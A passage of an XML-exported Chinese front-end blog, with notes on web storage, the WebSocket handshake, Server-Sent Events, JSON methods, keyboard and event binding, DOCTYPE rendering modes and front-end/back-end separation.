      <content type="text"><![CDATA[相同点都存在客户端 区别1、存储大小 cookie数据大小不能超过4k。 sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。 2、有效时间 localStorage 存储持久数据，浏览器关闭后数据不丢失除非主动删除数据； sessionStorage 数据在当前浏览器窗口关闭后自动删除。 cookie 设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭 3、数据与服务器之间的交互方式 cookie的数据会自动的传递到服务器，服务器端也可以写cookie到客户端 sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。 4、跨会话能力 cookie和localStorage可以跨相同源的页面 sessionStorage只能在同一个页面内存取]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[websocket简单介绍]]></title>
      <url>http://yoursite.com/2017/04/17/websocket%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/</url>
      <content type="text"><![CDATA[http特点HTTP的生命周期通过 Request 来界定，也就是一个 Request 一个 Response ，那么在 HTTP1.0 中，这次HTTP请求就结束了。 在HTTP1.1中进行了改进，使得有一个keep-alive，也就是说，在一个HTTP连接中，可以发送多个Request，接收多个Response。但是请记住 Request = Response ， 在HTTP中永远是这样，也就是说一个request只能有一个response。而且这个response也是被动的，不能主动发起。 传统即使通讯手段 轮询：客户端定时向服务器发送Ajax请求，服务器接到请求后马上返回响应信息并关闭连接。长轮询：客户端向服务器发送Ajax请求，服务器接到请求后hold住连接，直到有新消息才返回响应信息并关闭连接，客户端处理完响应信息后再向服务器发送新的请求。长连接：客户端建立连接，服务器端就能源源不断地往客户端输入数据。 ajax+定时器无限循环 页面插入一个隐藏的iframe，无限reload ajax调用完成，再进行递归 iframe记载完成，删除先前的iframe，在新建一个iframe 特点： 前两个方式，由于是异步的，返回的响应有可能是无需的 http无状态，断开连接，在新建连接需要带上上次的信息 需要客户端发请求，服务端才会响应 无限循环容易造成资源浪费，很多响应也许资源未变化，对服务器处理速度也是很大考验 对于长轮询方式，考验服务器并发的能力 websocket的连接首先Websocket是基于HTTP协议的，或者说借用了HTTP的协议来完成一部分握手，起初浏览器会发起一个http请求，在取得浏览器响应后，建立的连接会从http升级为web socket协议。典型的握手： GET /chat HTTP/1.1Host: server.example.comUpgrade: websocketConnection: UpgradeSec-WebSocket-Key: x3JJHMbDL1EzLkh9GBhXDw==Sec-WebSocket-Protocol: chat, superchatSec-WebSocket-Version: 13Origin: http://example.com 其中 Upgrade: websocketConnection: Upgrade 这个就是Websocket的核心了，告诉 Apache 、 Nginx 等服务器发起的是Websocket协议，找到对应的助理处理，不是HTTP! Sec-WebSocket-Key是一个Base64 encode的值，这个是浏览器随机生成的，告诉服务器：需要验证服务器是不是真的是Websocket助理。 Sec_WebSocket-Protocol是一个用户定义的字符串（第二个参数），用来区分同URL下，不同的服务所需要的协议。 Sec-WebSocket-Version 是告诉服务器所使用的 Websocket Draft（协议版本），在最初的时候，Websocket协议还在Draft阶段，各种奇奇怪怪的协议都有，而且还有很多期奇奇怪怪不同的东西，什么Firefox和Chrome用的不是一个版本之类的，当初Websocket协议太多可是一个大难题。不过现在还好，已经定下来啦。 然后服务器会返回下列东西，表示已经接受到请求， 成功建立Websocket啦！ HTTP/1.1 101 Switching ProtocolsUpgrade: websocketConnection: UpgradeSec-WebSocket-Accept: HSmrc0sMlYUkAGmm5OPpG2HaGWk=Sec-WebSocket-Protocol: chat 这里开始就是HTTP最后负责的区域了，告诉客户，我已经成功切换协议啦~ Upgrade: websocketConnection: Upgrade 依然是固定的，告诉客户端即将升级的是 Websocket 协议，而不是mozillasocket，lurnarsocket或者shitsocket。 Sec-WebSocket-Accept 这个则是经过服务器确认，并且加密过后的Sec-WebSocket-Key，证明是Websocket助理。 后面的， Sec-WebSocket-Protocol 则是表示最终使用的协议。 至此，HTTP已经完成它所有工作了，接下来就是完全按照Websocket协议进行了。 websocket优点 为什么他会解决服务器上消耗资源的问题呢？（不是很明白）其实我们所用的程序是要经过两层代理的，即HTTP协议在Nginx等服务器的解析下，然后再传送给相应的Handler（PHP等）来处理。简单地说，我们有一个非常快速的 接线员（Nginx） ，他负责把问题转交给相应的 客服（Handler）。本身接线员基本上速度是足够的，但是每次都卡在客服（Handler）了，老有客服处理速度太慢。，导致客服不够。Websocket就解决了这样一个难题，建立后，可以直接跟接线员建立持久连接，有信息的时候客服想办法通知接线员，然后接线员在统一转交给客户。这样就可以解决客服处理速度过慢的问题了。 解决了服务器响应速度和并发问题 可以随时双向通信 只需建立一次连接，可以保持状态，也解决了响应信息同步问题 引用 WebSocket 介绍 看完让你彻底搞懂Websocket原理 Web通信之长连接、长轮询（long polling） 代码示例]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[SSE简单介绍]]></title>
      <url>http://yoursite.com/2017/04/16/SSE%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D/</url>
      <content type="text"><![CDATA[概述传统的网页都是浏览器向服务器“查询”数据，但是很多场合，最有效的方式是服务器向浏览器“发送”数据。比如，球赛的文字直播，服务器发送事件（Server-Sent Events，简称SSE）就是为了解决这个问题，而提出的一种新API，部署在EventSource对象上。目前，除了IE，其他主流浏览器都支持。简单说，所谓SSE，就是浏览器向服务器发送一个HTTP请求，然后服务器不断单向地向浏览器推送“信息”（message）。SSE与WebSocket有相似功能，都是用来建立浏览器与服务器之间的通信渠道。两者的区别在于： WebSocket是全双工通道，可以双向通信，功能更强；SSE是单向通道，只能服务器向浏览器端发送。 WebSocket是一个新的协议，需要服务器端支持；SSE则是部署在HTTP协议之上的，现有的服务器软件都支持。 SSE是一个轻量级协议，相对简单；WebSocket是一种较重的协议，相对复杂。 SSE默认支持断线重连，WebSocket则需要额外部署。 SSE支持自定义发送的数据类型。 客户端代码首先，浏览器向服务器发起连接，生成一个EventSource的实例对象。 var source = new EventSource(url); 参数url就是服务器网址，必须与当前网页的网址在同一个网域（domain），而且协议和端口都必须相同。 新生成的EventSource实例对象，有一个readyState属性source.readyState，表明连接所处的状态。它可以取以下值： 0，相当于常量EventSource.CONNECTING，表示连接还未建立，或者连接断线。 1，相当于常量EventSource.OPEN，表示连接已经建立，可以接受数据。 2，相当于常量EventSource.CLOSED，表示连接已断，且不会重连。 连接一旦建立，就会触发open事件，可以定义相应的回调函数。 source.onopen = function(event) &#123; // handle open event&#125;;// 或者source.addEventListener("open", function(event) &#123; // handle open event&#125;, false); 收到数据就会触发message事件。 source.onmessage = function(event) &#123; var data = event.data; var origin = event.origin; var lastEventId = event.lastEventId; // handle message&#125;;// 或者source.addEventListener("message", function(event) &#123; var data = event.data; var origin = event.origin; var lastEventId = event.lastEventId; // handle message&#125;, false); 参数对象event有如下属性： data：服务器端传回的数据（文本格式）。 origin： 服务器端URL的域名部分，即协议、域名和端口。 lastEventId：数据的编号，由服务器端发送。如果没有编号，这个属性为空。 如果发生通信错误（比如连接中断），就会触发error事件。 source.onerror = function(event) &#123; // handle error event&#125;;// 或者source.addEventListener("error", function(event) &#123; // handle error event&#125;, false); 服务器可以与浏览器约定自定义事件。这种情况下，发送回来的数据不会触发message事件。 source.addEventListener("foo", function(event) &#123; var data = event.data; var origin = event.origin; var lastEventId = event.lastEventId; // handle message&#125;, false); 上面代码表示，浏览器对foo事件进行监听。 close方法用于关闭连接。 source.close(); 数据格式服务器端发送的数据的HTTP头信息如下： Content-Type: text/event-streamCache-Control: no-cacheConnection: keep-alive 后面的行都是如下格式： field: value\n field可以取四个值：“data”, “event”, “id”, or “retry”，也就是说有四类头信息。每次HTTP通信可以包含这四类头信息中的一类或多类。\n代表换行符。 以冒号开头的行，表示注释。通常，服务器每隔一段时间就会向浏览器发送一个注释，保持连接不中断。 : This is a comment 下面是一些例子。 : this is a test stream\n\n data: some text\n\n data: another message\ndata: with two lines \n\ndata：数据栏 数据内容用data表示，可以占用一行或多行。如果数据只有一行，则像下面这样，以“\n\n”结尾。 data: message\n\n 如果数据有多行，则最后一行用“\n\n”结尾，前面行都用“\n”结尾。 data: begin message\ndata: continue message\n\n 总之，最后一行的data，结尾要用两个换行符号，表示数据结束。 以发送JSON格式的数据为例。 data: {\ndata: “foo”: “bar”,\ndata: “baz”, 555\ndata: }\n\nid：数据标识符 数据标识符用id表示，相当于每一条数据的编号。 id: msg1\ndata: message\n\n 浏览器用lastEventId属性读取这个值。一旦连接断线，浏览器会发送一个HTTP头，里面包含一个特殊的Last-Event-ID头信息，将这个值发送回来，用来帮助服务器端重建连接。因此，这个头信息可以被视为一种同步机制。 event栏：自定义信息类型 event头信息表示自定义的数据类型，或者说数据的名字。 event: foo\ndata: a foo event\n\n data: an unnamed event\n\n event: bar\ndata: a bar event\n\n 上面的代码创造了三条信息。第一条是foo，触发浏览器端的foo事件；第二条未取名，表示默认类型，触发浏览器端的message事件；第三条是bar，触发浏览器端的bar事件。 retry：最大间隔时间 浏览器默认的是，如果服务器端三秒内没有发送任何信息，则开始重连。服务器端可以用retry头信息，指定通信的最大间隔时间。 retry: 10000\n 服务器代码服务器端发送事件，要求服务器与浏览器保持连接。对于不同的服务器软件来说，所消耗的资源是不一样的。Apache服务器，每个连接就是一个线程，如果要维持大量连接，势必要消耗大量资源。Node.js则是所有连接都使用同一个线程，因此消耗的资源会小得多，但是这要求每个连接不能包含很耗时的操作，比如磁盘的IO读写。代码示例 引用 SSE：服务器发送事件,使用长链接进行通讯 Server-Sent Events in Node.js]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[JSON的两个方法]]></title>
      <url>http://yoursite.com/2017/04/15/JSON/</url>
      <content type="text"><![CDATA[JSON.stringify 第二个参数是数组，那么序列化后的结构只包含数组中指定的属性 var book = &#123; "title": "Professional JavaScript", "authors": [ "Nicholas C. Zakas" ], edition: 3, year: 2011&#125;;var jsonText = JSON.stringify(book, ["title", "edition"]);//&#123;"title":"Professional JavaScript","edition":3&#125; 第二个参数是函数，函数的第一个参数是属性名，第二个参数是属性值，如果不是名值对，那么属性名是空字符串 var book = &#123; "title": "Professional JavaScript", "authors": [ "Nicholas C. Zakas" ], edition: 3, year: 2011 &#125;;var jsonText = JSON.stringify(book, function(key, value)&#123; switch(key)&#123; case "authors": return value.join(",") case "year": return 5000; case "edition": return undefined;&#125;&#125;);//&#123;"title":"Professional JavaScript","authors":"Nicholas C. Zakas","year":5000&#125;//但是我在chrome实验，发现key是空字符串，value是整个book对象 第三个参数是数值，表示结果每个级别缩进的空格数，最大是10，超过10也会按10计算（每行还会自动换行） 第三个参数是数值是字符串 var jsonText = JSON.stringify(book, null, " - -");&#123; --"title": "Professional JavaScript", --"authors": [ ----"Nicholas C. Zakas" --], --"edition": 3, --"year": 2011&#125; 可以给对象定义toJSON方法，自定义返回格式（Date对象就有toJSON方法） var book = &#123; "title": "Professional JavaScript", "authors": [ "Nicholas C. Zakas" ], edition: 3, year: 2011, toJSON: function()&#123; return this.title; &#125; &#125;;var jsonText = JSON.stringify(book);//"Professional JavaScript" var book = &#123; "title": "Professional JavaScript", "authors": [ "Nicholas C. Zakas" ], edition: 3, year: 2011, a:&#123; toJSON: function()&#123; return undefined;//此处返回undefined,导致a属性被忽略 &#125; &#125; &#125;;var jsonText = JSON.stringify(book);//"&#123;"title":"Professional JavaScript","authors":["Nicholas C. Zakas"],"edition":3,"year":2011&#125;" 执行顺序：1、如果存在toJSON，就先执行此方法2、如果存在第二个参数，那么就以1中执行的结果为基础执行过滤器3、以2中执行的结果序列化 JSON.parse 第二个参数是函数 var book = &#123; "title": "Professional JavaScript", "authors": [ "Nicholas C. Zakas" ], edition: 3, year: 2011&#125;;var jsonText = JSON.stringify(book);var bookCopy = JSON.parse(jsonText, function(key, value)&#123; if(key=="authors")&#123;return undefined&#125; return value&#125;)//var book = &#123; //"title": "Professional JavaScript", //edition: 3, //year: 2011//&#125;; 兼容性 常见问题 ie6 7下不支持JSON var jsonText = JSON.stringify(book);//第一种方法var jsons = eval("("+jsonText+")");//第二种方法var func = new Function("return "+jsonText);var jsons = func(); 通用方法： &lt;script type="text/javascript" src="js/json2.js"&gt;&lt;/script&gt;]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[鼠标事件]]></title>
      <url>http://yoursite.com/2017/04/13/%E9%BC%A0%E6%A0%87%E4%BA%8B%E4%BB%B6/</url>
      <content type="text"><![CDATA[textinput “DOM3级事件”规范中引入了一个新事件，名叫textInput。根据规范，当用户在可编辑区域中输入字符时，就会触发这个事件。这个用于替代keypress的textInput事件的行为稍有不同。 区别之一就是任何可以获得焦点的元素都可以触发kepress事件，但只有可编辑区域才能触发textInput事件。 区别之二textInput事件只会在用户按下能够输入实际字符的键时才会被触发，而keypress事件则在按下那些能够影响文本显示的键时也会触发（例如退格键）。 由于textInput事件主要考虑是字符，因此它的event对象中还包含一个data属性，这个属性的值就是用户输入的字符（而非字符编码）。换句话说，用户在没有按上档键的情况下按下了S键，data的属性就是“s”，而如果在按住上档键时按下该键，data的值就是“S”。 keydown、keypress、keyup的区别 KeyPress主要用来捕获数字(注意：包括Shift+数字的符号)、字母（注意：包括大小写）、小键盘等除了F1-12、SHIFT、Alt、Ctrl、Insert、Home、PgUp、Delete、End、PgDn、ScrollLock、Pause、NumLock、{菜单键}、{开始键}和方向键外的ANSI字符，keypress事件不能对系统功能键(例如：后退、删除等，其中对中文输入法不能有效响应)进行正常的响应 KeyPress只能捕获单个字符，区分大小写 KeyDown 和KeyUp 可以捕获组合键。 KeyDown和KeyUp 对于单个字符捕获的KeyValue都是一个值，不区分大小写。 KeyPress不区分小键盘和主键盘的数字字符。 KeyDown和KeyUp区分小键盘和主键盘的数字字符。 其中PrtSc按键KeyPress、KeyDown和KeyUp 都不能捕获。 回车、上下左右、等功能键keydown、keypress、keyup都获取keyCode，并且值相等。 keypress事件的which值无法区分主键盘上的数字键和附键盘数字键的，而keydown、keyup的which值对主附键盘的数字键敏感。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[js原生事件绑定]]></title>
      <url>http://yoursite.com/2017/04/09/js%E5%8E%9F%E7%94%9F%E4%BA%8B%E4%BB%B6%E7%BB%91%E5%AE%9A/</url>
      <content type="text"><![CDATA[在HTML元素中内嵌事件处理程序&lt;!-- 输出“Clicked” —— 事件处理程序中，可以直接编写 JavaScript 代码 --&gt;&lt;input type="button" value="Click Me" onclick="alert('Clicked')" /&gt;&lt;!-- 输出“click” —— 事件处理程序中，可以直接访问事件对象 event --&gt;&lt;input type="button" value="Click Me" onclick="alert(event.type)" /&gt;&lt;!-- 输出“Click Me” —— 事件处理程序中，this 指向事件的目标元素 --&gt;&lt;input type="button" value="Click Me" onclick="alert(this.value)" /&gt;&lt;input type="button" value="Click Me" onclick="showMessage(event,this)" /&gt;&lt;a href="http://www.baidu.com" onclick="showMessage(event,this);return false;"&gt;baidu&lt;/a&gt;&lt;script&gt; function showMessage(e,t) &#123; alert(e.type); alert(t.value); &#125;&lt;/script&gt; 优点：简单、粗暴，浏览器兼容性好。缺点： 存在时差问题。用户可能会在 HTML 元素一出现在页面上时，就触发相应事件，但当时的事件处理程序有可能还未具备执行条件（例如事件处理程序所在的外部脚本文件还未加载或解析完毕），此时会引发 undefined 错误。 HTML 与 JavaScript 代码紧密耦合。如果要重命名事件处理程序，就要改动两个地方，容易改漏、改错。 事件属性&lt;input type="button" id='btn' value="Click Me" /&gt;&lt;script type="text/javascript"&gt; var btn = document.getElementById('btn'); // 绑定事件处理程序 btn.onclick = function() &#123; alert('Clicked'); alert(this.id); // 输出“myDiv” —— this 指向事件的目标元素 &#125; // 删除事件处理程序 btn.onclick = null;&lt;/script&gt; 特点：本质上，等于HTML事件处理程序; 优点： 传统、常用、浏览器兼容性好。 解决了HTML事件处理程序的两个缺点。 缺点：一个事件只能绑定唯一一个事件处理程序。 addEventListener和attachEvent 之前特性有过总结，就不再熬述！ jq中的bind$(ele).bind(type,[data],hadler) type: 含有一个或多个事件类型的字符串，由空格分隔多个事件。比如”click”或”submit”，还可以是自定义事件名。 data:作为event.data属性值传递给事件对象的额外数据对象 fn:绑定到每个匹配元素的事件上面的处理函数(也可以是布尔值，将第三个参数设置为false会使默认的动作失效。) 取消绑定是unbind jq中的on$(ele).on(type,selector,[data],handler) 该方法比bind方法多了一个参selector，该参数是用于对选定的元素进行过滤，元素队形中只有符合selector的才绑定该事件处理程序，其他参数同bind方法。该方法是目前应用最为广泛的。 解绑off jq中的livelive(type,[data],fn) 该方法直接将事件的监听器绑定到document对象上了，并没有直接绑定到元素上，元素对象触发事件后事件进行冒泡到docuemnt时才会执行相应的事件处理程序，这样做的好处是新添加的符合条件的元素对象无需在对形同类型的事件处理程序进行绑定，但这样同时会增加根节点的负担，因为所有元素对象的处理程序只有当时间冒泡到根节点时才会被执行，而且当子孙元素过多时，根节点可能将无法判断是哪个元素的请求而导致请求错误。解绑是die jq中的delegate$(ele).delegate(selector,type,[data],handler) 该方法通过代理的方式解决了上面live代理到document的问，selector用于指定触发事件的元素，而调用该方法的元素对象将会成为事件的代理，即事件的监听器将会绑定到该元素对象上，这样就可以指定代理元素对象，不用将所有的事件监听器都绑定到document上。解绑是undelegate jq中的其他事件one() 用于个元素对象绑定一次性事件处理程序，也就是绑定成功后该事件将只会被触发一次；toogle()该方法用于绑定点击事件处理函数，当传入多个函数时，第一次单击时执行死一个方法，第二次第二个，以此类推并循环；hover（）用于同时给mouseenter、mouseleave事件绑定事件处理函数，当只传入一个方法时两者的处理函数相同，有两个时第一个是mouseenter的，另一个是mouseleave的和bind传对象时的一样功效。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[DOCTYPE与浏览器模式分析]]></title>
      <url>http://yoursite.com/2017/04/09/DOCTYPE%E4%B8%8E%E6%B5%8F%E8%A7%88%E5%99%A8%E6%A8%A1%E5%BC%8F%E5%88%86%E6%9E%90/</url>
      <content type="text"><![CDATA[DOCTYPE的诞生DOCTYPE，或者称为 Document Type Declaration（文档类型声明，缩写 DTD）。通常情况下，DOCTYPE 位于一个 HTML 文档的最前面的位置，位于根元素 HTML 的起始标签之前。因为浏览器必须在解析 HTML 文档正文之前就确定当前文档的类型，以决定其需要采用的渲染模式，不同的渲染模式会影响到浏览器对于 CSS 代码甚至 JavaScript 脚本的解析。尤其是在 IE 系列浏览器中，由 DOCTYPE 所决定的 HTML 页面的渲染模式至关重要。可以把他看成是一个选择渲染模式的开关！究竟为何浏览器要制作这么一个“开关”。微软开发的 IE 系列浏览器中寿命最长的 IE6 伴随 Windows XP 诞生。相比上一个版本 IE5.5，IE6 确实有着许多重大的改进，其中对于页面渲染而言最大的变化就在于 IE6 支持了部分 CSS1 中的特性。例如，为一个块级元素设定宽度及高度时，不再作用于 border 外围，而是如 W3C 规范中所描述的仅仅是元素内容之上。这一点和 IE5.5 差别巨大。为了保证那些 90 年代后期的基于 IE6 之前版本开发的页面能够正常显示，即保证浏览器有向后兼容性，此“开关”诞生，微软试图通过对 DOCTYPE 的判断来决定浏览器采取何种模式工作，即是 IE6 还是 IE5.5 的问题。所以从 document.compatMode 返回的字符串值中也可以看出来，BackCompat 代表了向后兼容（即 IE5.5），CSS1Compat 代表了对 CSS1 规范的兼容（即 IE6）。由此，浏览器的工作模式被分为了混杂模式及标准模式。 值得注意的是，IE 的版本号一路从 6.0 升至了目前的 9.0，但升级仅限于标准模式。对于混杂模式，IE 的版本号永久的冻结在 5.5，这也算是为了向后兼容的巨大牺牲。也就是说即使我们使用着最新最高级的 IE9，但若我们不书写 DOCTYPE 或者使用了能够触发混杂模式的 DOCTYPE，那我们所面对的浏览器仍相当于是那个十几年前的老古董 IE5.5。而其他那些浏览器的混杂模式和标准模式之间却没有像IE中这么大的差别。 近似标准模式（Almost Standards Mode）从字面意思上看与标准模式非常类似，但确实有小的差别。主要体现在对于表格单元格内垂直方向布局渲染差异。IE8 开始、Firefox、Chrome、Safari、Opera 7.5 开始，这些浏览器的标准模式更加严格的遵循了 CSS2.1 规范，故对于在目前看来不太“标准”的以前的标准模式，被赋予了“近似标准模式”的名字。但是在较早的 IE6 IE7 以及 Opera 7.5 之前版本中，浏览器无法严格遵循 CSS2.1 规范，故对于它们来说没有这个近似标准模式，也可以理解为它们的近似标准模式就是标准模式。 混杂模式 近似标准模式 标准模式 DOCTYPE的选择不使用 DOCTYPE 一定会使 HTML 文档处于混杂模式，然而使用了 DOCTYPE，也不一定就能够使文档在所有浏览器中均处于标准模式。DOCTYPE 本身不就是一个“开关”吗？为何在有 DOCTYPE 的 HTML 文档之上仍然还会出现混杂模式？这个和以下条件有关： 使用了本身就会使浏览器进入混杂模式的古老的甚至是错误的 DOCTYPE； 在 DOCTYPE 之前出现了其他内容，如注释，甚至是 HTML 标签。 我们先说第一个条件。HTML 历史悠久，仅正确的 HTML 类型的 DOCTYPE 就有很多种。先看一个标准的 DOCTYPE：&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"&gt; 上面的 DOCTYPE 包含 6 部分：1 字符串“&lt;!DOCTYPE”2 根元素通用标识符“HTML”3 字符串“PUBLIC”4 被引号括起来的公共标识符（publicId）“-//W3C//DTD HTML 4.01//EN”5 被引号括起来的系统标识符（systemId）“http://www.w3.org/TR/html4/strict.dtd”6 字符串“&gt;” 其中根元素通用标识符、公共标识符、系统标识符均可以通过脚本调用 DOM 接口获得，分别对应 document.doctype.name、document.doctype.publicId、document.doctype.systemId（IE6 IE7 不支持）。 其实浏览器在嗅探 DOCTYPE 时只考虑了上述 6 部分中的第 1、2、4、6 部分，且不区分大小写。在各浏览器内核实现中，几乎都存在一个名单用于记录这些常见的 DOCTYPE 所对应的模式，例如 WebKit 内核中 DocTypeStrings.gperf 文件。各浏览器名单列表中触发模式的不同导致了某些 DOCTYPE 出现在不同浏览器中触发了不同模式的现象，如 。而对于名单之外的 DOCTYPE，浏览器之间处理的差异也会导致触发不同的模式，比如可能有的浏览器会将名单之外的 DOCTYPE 当作混杂模式，而有的却会一律当作标准模式。 如果力求最简，则 HTML5 的 DOCTYPE 是最佳选择：&lt;!DOCTYPE html&gt;，所有的主流浏览器均将这种只包含第 1、2、6 部分的最短的 DOCTYPE 视为标准模式。 如果力求稳妥，则较早的 HTML4.01 Strict 的 DOCTYPE 也是一种好的选择：&lt;!DOCTYPE HTML PUBLIC “-//W3C//DTD HTML 4.01//EN” “http://www.w3.org/TR/html4/strict.dtd&quot;&gt;，它在各主流浏览器中触发的模式与上面的 HTML5 的完全一致。 有时候我们处于特殊情况也希望浏览器能够都处于近似标准模式，则可选择：&lt;!DOCTYPE HTML PUBLIC “-//W3C//DTD HTML 4.01 Transitional//EN” “http://www.w3.org/TR/html4/loose.dtd&quot;&gt;。 DOCTYPE之前不能出现的内容前面提到，DOCTYPE 作为一个决定浏览器对于 HTML 文档采取何种模式“开关”，应出现在 HTML 文档的最前面。但有时候处于某些原因，有的作者会在 DOCTYPE 之前防止一些内容，可能是服务端输出的某些信息。这样会让浏览器感到极为“困惑”，它第一眼看到的不是 DOCTYPE，故可能会认为页面没有 DOCTYPE，则可能触发了混杂模式。然而事实上在这一点各浏览器的处理并不相同。我们将 DOCTYPE 之前可能出现的这些内容分类，它们包括： 普通文本 HTML标签 HTML注释 XML声明 IE条件注释 对于普通文本和HTML标签，各浏览器均进入了混杂模式，这个很好理解，都看到疑似的HTML文档正文了，浏览器不太会往下追查 DOCTYPE在哪里。 对于HTML注释和XML声明，它们和上面的普通文本和HTML标签有些差别，它们不会在页面中展示出来，即不可视。这时，有的浏览器则显得十分“智能”，非IE浏览器均会忽略它们的存在，DOCTYPE被正确解析。但是在IE6中，DOCTYPE之前的XML声明会导致页面进入混杂模式，而所有的IE均会使DOCTYPE之前出现了HTML注释的页面进入混杂模式。在IE9中当出现这种情况时，浏览器在控制台中给出了提示：“HTML1113: 文档模式从IE9标准 重新启动到Quirks”，看来微软在这一点上不打算“随大流”，这样做也可以敦促作者尽量避免在DOCTYPE之前加入其他内容。 有的作者很聪明，他既在DOCTYPE之前加入了他需要的内容，却又没有使IE由于这些内容而进入混杂模式。他可能会这么写： &lt;![if !IE]&gt;&lt;![endif]&gt; &lt;![if false]&gt;&lt;![endif]&gt; 上面这些IE条件注释在非IE浏览器中，可能完全被忽略，可能被解释为普通HTML注释。但是在IE中它们全部消失了，因为这就是 IE条件注释的作用。所以这也是目前比较合适的在DOCTYPE之前写点什么又保证所有浏览器均为标准模式的做法，但我们仍然不推荐在DOCTYPE之前加入任何非空白内容。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[前后端分离介绍]]></title>
      <url>http://yoursite.com/2017/04/05/%E5%89%8D%E5%90%8E%E7%AB%AF%E5%88%86%E7%A6%BB%E4%BB%8B%E7%BB%8D/</url>
      <content type="text"><![CDATA[引言这两年前后端分离的概念遍布于前端世界的各个角落，就连rd也能说出个所以然！对于前端，可能每个人对这个概念的理解都不一样！我的理解是前后端本是一家子，是亲兄弟，干活时，我可以帮你做，你也可以帮我做，后来各自成家，开始有了界限，不过还是可以互相帮助，再后来有了儿子，有了孙子…，血缘关系越来越远，界限原来越清晰，分离的程度越来越高。最近同事就问了我这么个问题，那么我就看了几篇文章再结合自己的实践，总结一下这个概念。 Web研发模式演变JSP时代 本地开发页面需要起一个Tomcat或Apache，调试和开发对前端来说都不是很友好 JSP可以内嵌java代码，前后端的代码完全柔和在了一起 后端为主的MVC时代在这个时代，后端采用MVC开发模式，可以将前端页面放在View层，并且可以套用Velocity等模板 后端或者前端需要套模板，并且依赖后端测试环境 职责不清，经常遇到前后端都可以做，但是互相推诿的事情 Ajax带来的SPA时代 前后端需要约定接口 如果页面非常复杂，那么用Ajax做SPA将会非常痛苦 过多的请求和DOM操作，导致性能不佳 容易造成白屏 前端为主的MV*时代新框架如雨后春笋般涌现，如react、vue、angularjs等 好处： 前后端职责清晰，前端专注于页面呈现，后端则可以专注于业务逻辑的处理，输出RESTful等接口，模拟数据也不难 粒度可控，代码有层次，符合前端开发习惯 无需套模板 不足： 前后端代码无法复用 全异步，对SEO不利，往往还需要服务端做同步渲染的降级方案。 SPA不能满足所有需求，依旧存在大量多页面应用。URL Design需要后端配合，前端无法完全掌控。 Node带来的全栈时代前端的页面，无论有无模板都需要放在服务器上，那么现在用Node作为服务器，把我们的页面放在这样的服务器上，此服务器就由前端负责。职责扩展： 路由可以由前端控制，页面和Node可以用相同路由（可以解决SEO问题） 前后端代码复用 后端专注于业务逻辑，提供各式接口，由Node服务器按需调用传给页面 性能优化更加方便，不在受制于以前的后端 什么是前后端分离对于这个概念没有绝对的定义，仁者见仁智者见智，最容易想到的就是SPA，SPA确实做到了前后端分离，但这种方式存在两个问题： WEB服务中，SPA类占的比例很少。很多场景下还有同步/同步+异步混合的模式，SPA不能作为一种通用的解决方案。 现阶段的SPA开发模式，接口通常是按照展现逻辑来提供的，有时候为了提高效率，后端会帮我们处理一些展现逻辑，这就意味着后端还是涉足了View层的工作，不是真正的前后端分离。 SPA式的前后端分离，认为只要是客户端的就是前端，服务器端的就是后端，对于我厂，SPA已经够用，但是对于业务更复杂的公司，这种分法已经无法满足前后端分离的需求，从职责上划分才能满足： 前端：负责View和Controller层。（即前端要把后端的一部分工作抢了） 后端：只负责Model层，业务处理/数据等。 为什么要前后端分离 前后端职责不清 开发效率问题 局限前端的发挥 本厂实践m端模板前后端分离背景：模板一直由rd开发，但是由于众所周知的原因，rd一直不能很好的完成这个任务，也是为了解放他们的双手，上级领导要求模板今后就由前端维护，一场浩大的模板重构项目就开始了 以前模板充斥各种字段和方法，历史原因，后端同学只知道其中一部分，重构后，后端完全输出json数据，方便前端同学套模板，也还有少量的方法，不过后端同学也给出了API文档 测试环境问题，起初测试环境是由前端大牛用Node搭建了一个，但是需要前端造假数据，想想一个新页面需要多少假数据，这个量要花多少时间，后来后端提供了一个测试服务器，只需将写好的模板用ftp传上去即可，还能提示错误信息，完美！ 那么这这种页面还处于Ajax时代，同步和Ajax异步并行，只不过纠结于模板放在谁那里维护！ pc发布和管理后台界面完全由js生成，后端数据要么放在模板里面输出，要么用Ajax请求，这种方式是我最讨厌的方式，与其说方便了后端同学不如说坑了自己，坏处已在上面阐明，但是事无绝对！ react和vue和上面一样，界面完全由js生成，后端数据要么放在模板里面输出，要么用Ajax请求，但是凭借框架强大的渲染能力和友好的开发方式，还是受到了众多前端童鞋的欢迎 淘宝基于Node的前后端分离渲染这块工作，对于前端开发者的日常工作来说，佔了非常大的比例，也是最容易与后端开发纠结不清的地方。回首过去前端技术发展的这几年， View这个层面的工作，经过了许多次的变革，像是：1、Form Submit全页刷新 =&gt; AJAX局部刷新2、服务端续染 + MVC =&gt; 客户端渲染 + MVC3、传统换页跳转 =&gt; 单页面应用可以观察到在这几年，大家都倾向将渲染这件事，从服务器端端移向了浏览器端。而服务器端则专注于服务化 ，提供数据接口。 浏览器端渲染的好处： 摆脱业务逻辑与呈现逻辑在Java模版引擎中的耦合与混乱。 针对多终端应用，更容易以接口化的形式。在浏览器端搭配不同的模版，呈现不同的应用。 页面呈现本来就不仅是html，在前端的渲染可以更轻易的以组件化形式 (html + js + css)提供功能，使得前端组件不需依赖于服务端产生的html结构。 脱离对于后端开发、发佈流程的依赖。 方便联调。 浏览器端渲染造成的坏处： 模版分离在不同的库。有的模版放在服务端 (JAVA)，而有的放在浏览器端 (JS)。前后端模版语言不相通。 需要等待所有模版与组件在浏览器端载入完成后才能开始渲染，无法即开即看。 首次进入会有白屏等待渲染的时间，不利于用户体验 开发单页面应用时，前端Route与服务器端Route不匹配，处理起来很麻烦。 重要内容都在前端组装，不利于SEO 